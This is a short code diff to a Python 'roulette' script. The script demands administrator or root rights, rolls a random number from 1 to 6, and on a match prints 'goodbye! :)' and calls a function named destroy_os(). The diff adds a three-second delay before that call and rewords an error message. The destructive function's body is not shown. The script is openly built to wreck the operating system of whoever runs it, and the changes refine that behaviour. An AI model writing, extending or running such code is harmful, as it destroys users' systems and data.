@@ -2,6 +2,7 @@ import os
 import ctypes
 import sys
 from random import randint
+import time
 
 banner = """
 ______              _              ______            _      _   _       
@@ -34,7 +35,7 @@ def check_os():
     except AttributeError:
         is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
     if not is_admin:
-        print("[Error] You need to run this script with sudo or as root.")
+        print("[Error] You need to run this script with sudo or as an administrator.")
         sys.exit()
 
 
@@ -62,6 +63,7 @@ if __name__ == "__main__":
         bullet = randint(1,6)
         if trigger == bullet:
             print("goodbye! :)")
+            time.sleep(3)
             destroy_os()
         else:
             print("You got lucky this time :))")
